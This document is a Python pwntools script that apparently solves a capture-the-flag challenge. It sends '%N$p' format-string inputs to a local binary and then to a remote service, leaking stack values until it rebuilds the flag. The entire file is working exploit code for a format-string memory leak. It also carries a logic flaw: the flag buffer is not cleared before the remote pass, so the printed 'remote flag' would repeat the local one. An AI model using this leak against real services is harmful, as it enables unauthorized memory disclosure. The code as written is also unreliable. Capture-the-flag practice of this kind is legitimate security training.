from pwn import *

def exploit(binary, remote_address = False, remote_port = False):
    flag = b''
    flag_started = False
    #I might break this off into its own function later.
    i = 1
    while True:
        
        target = process(binary)

        target.sendline('%'+str(i)+'$p')
        #Because I'm using %p's, I'll either get hex starting with '0x' or '(nil)'. The try statement is used to prevent it from crashing if I hit nil.
        try:
            print(target.recvuntil(b'0x', timeout=1))
            leak = target.recvline()

            chunk = p64(int(leak, 16))
            #The main point of this is to get the starting index of the flag and get a few fewer connections to the remote server and save some time, especially if it's running slowly.
            if b'flag' in chunk:
                flag_started = True
                flag_starting_index = i
            if flag_started == True:
                flag += p64(int(leak, 16))

            if b'}' in chunk:
                break
        except:
            pass
        i += 1        
        target.close()
    end = flag.find(b'}')
    flag = flag[:end+1]
    print('The local flag is', flag.decode('ascii'))
    
    if remote_address != False:
        i = flag_starting_index
        while True:
            target = remote(remote_address, remote_port)

            target.sendline('%'+str(i)+'$p')
            try:
                print(target.recvuntil(b'0x', timeout=1))
                leak = target.recvline()

                chunk = p64(int(leak, 16))

                if b'flag' in chunk:
                    flag_started = True
                    flag_starting_index = i
                if flag_started == True:
                    flag += p64(int(leak, 16))

                if b'}' in chunk:
                    break
            except:
                pass
            i += 1        
            target.close()
    end = flag.find(b'}')
    flag = flag[:end+1]
    print('The remote flag that should be submitted as the answer is:', flag.decode('ascii'))